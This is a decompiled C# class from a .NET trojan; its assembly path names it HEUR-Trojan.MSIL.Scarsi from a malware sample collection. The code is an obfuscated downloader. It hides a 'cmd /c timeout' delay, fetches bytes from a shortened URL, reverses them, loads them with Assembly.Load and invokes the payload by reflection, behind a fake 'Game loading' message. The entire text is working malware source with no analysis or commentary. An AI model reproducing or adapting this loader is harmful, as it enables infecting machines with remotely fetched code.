// Decompiled with JetBrains decompiler
// Type: IndexerProductClass
// Assembly: LibCADPortable_2_1_4, Version=2.2.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 56003C3B-2EA8-4D4F-8A52-24E609F14F96
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Scarsi.gen-886c30550a351ba7d5abe9f3f1fc36ba8e5811132fc041dc79db813c86964877.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

internal sealed class IndexerProductClass
{
  [DebuggerBrowsable(DebuggerBrowsableState.Never)]
  private static IndexerProductClass.ValExpressionSerializer _Merchant;
  private static IndexerProductClass OrderTask;

  public IndexerProductClass()
  {
    if (true)
      ;
    // ISSUE: explicit constructor call
    base.\u002Ector();
    int num = 0;
    if (\u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_7a9bda6c2d9c49a7aa5c0a642f5f6bbd == 0)
      num = 0;
    switch (num)
    {
    }
  }

  private static IndexerProductClass.ValExpressionSerializer EnableMerchant() => IndexerProductClass._Merchant;

  private static void SelectMerchant(IndexerProductClass.ValExpressionSerializer value)
  {
    int num = 1;
    IndexerProductClass.ValExpressionSerializer expressionSerializer;
    while (true)
    {
      switch (num)
      {
        case 0:
          goto label_4;
        case 1:
          expressionSerializer = value;
          if (false)
          {
            num = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_918e4eace274440ba1b9d5357f91a5fb == 0 ? 0 : 0;
            continue;
          }
          goto label_6;
        default:
          goto label_2;
      }
    }
label_4:
    return;
label_2:
    return;
label_6:
    IndexerProductClass._Merchant = expressionSerializer;
  }

  [STAThread]
  private static void InvokeMerchant()
  {
    IndexerProductClass.ValExpressionSerializer expressionSerializer = new IndexerProductClass.ValExpressionSerializer();
    if (true)
      goto label_10;
    else
      goto label_7;
label_1:
    int num;
    switch (num)
    {
      case 1:
        return;
      case 2:
        goto label_7;
      case 3:
        return;
      case 4:
      case 5:
        break;
      default:
        goto label_4;
    }
label_2:
    if (false)
    {
      num = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_5b3f7686e8ca419b875b90ac08f5405c != 0 ? 0 : 0;
      goto label_1;
    }
    else
      IndexerProductClass.ReadMerchant();
label_4:
    IndexerProductClass.PushMerchant();
    num = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_1dc86f0698e342b5a70eefc48204c8d5 != 0 ? 3 : 1;
    goto label_1;
label_7:
    if (true)
    {
      IndexerProductClass.SetupMerchant();
      num = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_acf74751e99e4de7a3fa82e7605271e9 == 0 ? 0 : 5;
      goto label_1;
    }
    else
      goto label_2;
label_10:
    IndexerProductClass.SelectMerchant(expressionSerializer);
    num = 2;
    goto label_1;
  }

  private static void SetupMerchant()
  {
    int num1 = IndexerProductClass.EnableMerchant() != null ? 1 : 0;
    if (true)
      goto label_8;
label_3:
    bool flag;
    if (!flag)
      return;
label_5:
    IndexerProductClass.PopTask(IndexerProductClass.ReadTask((object) IndexerProductClass.EnableMerchant().RegisterMerchant()));
    int num2 = 0;
    if (\u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_c61b211219f7407b8bd4e32cfbd747c3 == 0)
      goto label_6;
label_1:
    switch (num2)
    {
      case 0:
        return;
      case 1:
        goto label_5;
      default:
        return;
    }
label_6:
    num2 = 0;
    goto label_1;
label_8:
    flag = num1 != 0;
    goto label_3;
  }

  private static void ReadMerchant()
  {
    int num1 = 3;
    while (true)
    {
      int num2 = num1;
      MemberInfo[] members;
      int index1;
      Type type;
      bool flag;
      Type[] types;
      int index2;
      int index3;
      Assembly[] assemblies;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 15:
            if (index1 >= members.Length)
            {
              ++index3;
              goto case 13;
            }
            else
            {
              num2 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_f28f9d1dcec94025af6fbdb29380272d == 0 ? 1 : 4;
              continue;
            }
          case 2:
          case 6:
            if (!flag)
            {
              num2 = 9;
              continue;
            }
            assemblies = Thread.GetDomain().GetAssemblies();
            if (true)
              goto label_26;
            else
              goto case 14;
          case 3:
            int num3 = IndexerProductClass.EnableMerchant().ForgotMerchant() <= 0 ? 1 : 0;
            if (false)
            {
              num2 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_84110e451a9f4dd98017d7fc21481e7b != 0 ? 2 : 2;
              continue;
            }
            flag = num3 != 0;
            num2 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_332b98223f6449628dd1029a9ee4c08a == 0 ? 3 : 6;
            continue;
          case 4:
          case 7:
            MemberInfo memberInfo = members[index1];
            try
            {
              ((IndexerProductClass.ValExpressionSerializer) IndexerProductClass.ComputeTask()).ValidateMerchant((int) type.InvokeMember("Tzlqfo", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null));
            }
            catch
            {
            }
            ++index1;
            num2 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_402186d35cd64e998455ee3cf922a322 != 0 ? 1 : 1;
            continue;
          case 5:
            goto label_22;
          case 8:
            members = type.GetMembers();
            num2 = 10;
            continue;
          case 9:
            goto label_27;
          case 10:
            index1 = 0;
            num2 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_f162494ab43b4cce9fce77f0d23af3cd != 0 ? 7 : 15;
            continue;
          case 13:
            if (index3 >= types.Length)
            {
              ++index2;
              num2 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_be35034af6f446db90ae307d47c865ca != 0 ? 0 : 0;
              continue;
            }
            type = types[index3];
            num2 = 8;
            continue;
          case 14:
            if (false)
            {
              num2 = 12;
              continue;
            }
            index2 = 0;
            num2 = \u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_20ef885e92914ef2838df0966f41188b != 0 ? 11 : 0;
            continue;
          default:
            goto label_21;
        }
      }
label_21:
      Assembly[] assemblyArray;
      if (index2 >= assemblyArray.Length)
        goto label_25;
label_22:
      types = assemblyArray[index2].GetTypes();
      index3 = 0;
      num1 = 13;
      continue;
label_26:
      assemblyArray = assemblies;
      num1 = 14;
    }
label_27:
    return;
label_25:;
  }

  private static void PushMerchant()
  {
    string str = string.Format("Game loading {0}", (object) ((IndexerProductClass.ValExpressionSerializer) IndexerProductClass.ComputeTask()).ForgotMerchant());
    if (false)
      return;
    Console.WriteLine(str);
    int num = 0;
    if (\u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_bd25b2b6988942e281aaa9c286aebf0c == 0)
      goto label_6;
label_1:
    switch (num)
    {
      case 0:
        return;
      default:
        return;
    }
label_6:
    num = 0;
    goto label_1;
  }

  internal static bool InsertTask() => IndexerProductClass.OrderTask == null;

  internal static IndexerProductClass ForgotTask() => IndexerProductClass.OrderTask;

  internal static object ReadTask([In] object obj0) => (object) ((List<byte>) obj0).ToArray();

  internal static object PopTask([In] object obj0) => (object) Assembly.Load((byte[]) obj0);

  internal static object ComputeTask() => (object) IndexerProductClass.EnableMerchant();

  private sealed class ValExpressionSerializer
  {
    [DebuggerBrowsable(DebuggerBrowsableState.Never)]
    private int _Error;
    private static IndexerProductClass.ValExpressionSerializer ManageTask;

    internal ValExpressionSerializer()
    {
      if (false)
        ;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      int num = 0;
      if (\u003CModule\u003E\u007Bca46f442\u002D4e28\u002D4b15\u002Da4b1\u002D6e8ea92745c9\u007D.m_cfb7db59aa664afc83f44824b6b3245c.m_9b8b36cb9769485a8633fff7fe23c7c5 == 0)
        num = 0;
      switch (num)
      {
        default:
          ProcessStartInfo processStartInfo = new ProcessStartInfo();
          IndexerProductClass.ValExpressionSerializer.TestTask((object) processStartInfo, (object) "cmd");
          processStartInfo.Arguments = "/c timeout 19";
          processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
          IndexerProductClass.ValExpressionSerializer.ListTask(IndexerProductClass.ValExpressionSerializer.DeleteTask((object) processStartInfo));
          break;
      }
    }

    internal int ForgotMerchant()
    {
      if (false)
        ;
      return this._Error;
    }

    internal void ValidateMerchant(int instance)
    {
      int num = instance;
      if (false)
        return;
      this._Error = num;
    }

    internal List<byte> RegisterMerchant()
    {
      try
      {
        if (true)
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      List<byte> byteList1 = new List<byte>();
      if (true)
        goto label_6;
label_4:
      List<byte> byteList2;
      byteList2.AddRange((IEnumerable<byte>) ((Task<byte[]>) typeof (HttpClient).GetMethod("GetByteArrayAsync", new Type[1]
      {
        typeof (Uri)
      }).Invoke((object) new HttpClient(), new object[1]
      {
        (object) new Uri("https://tiny.one/yckz6ajz")
      })).Result);
      byteList2.Reverse();
      List<byte> byteList3 = byteList2;
      if (true)
        goto label_7;
label_5:
      List<byte> byteList4;
      return byteList4;
label_7:
      byteList4 = byteList3;
      goto label_5;
label_6:
      byteList2 = byteList1;
      goto label_4;
    }

    internal static void TestTask([In] object obj0, [In] object obj1) => ((ProcessStartInfo) obj0).FileName = (string) obj1;

    internal static object DeleteTask([In] object obj0) => (object) Process.Start((ProcessStartInfo) obj0);

    internal static void ListTask([In] object obj0) => ((Process) obj0).WaitForExit();

    internal static bool StartTask() => IndexerProductClass.ValExpressionSerializer.ManageTask == null;

    internal static IndexerProductClass.ValExpressionSerializer VerifyTask() => IndexerProductClass.ValExpressionSerializer.ManageTask;
  }
}
